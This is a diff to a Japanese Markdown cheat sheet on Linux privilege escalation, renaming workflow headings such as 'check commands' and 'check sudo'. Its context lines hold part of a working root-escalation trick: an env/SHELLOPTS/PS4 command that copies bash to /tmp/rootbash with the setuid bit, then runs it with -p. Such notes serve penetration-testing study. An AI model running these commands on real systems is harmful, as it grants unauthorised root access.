@@ -1,10 +1,9 @@
 # Linux Privilege Escalation
 
 ## 実行フロー
-1. sudo -lを実行
-2. LinEnumを実行
-3. CronTabに設定されているスクリプトを確認
-4. sudoのバージョンを確認
+1. コマンドの確認
+2. ファイルの確認
+3. sudoの確認
 
 ## コマンドの確認
 root権限で実行できるコマンドの確認
@@ -74,7 +73,7 @@ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootba
 /tmp/rootbash -p
 ```
 
-## sudoのバージョンを確認
+## sudoの確認
 ```
 sudo -V
 ```
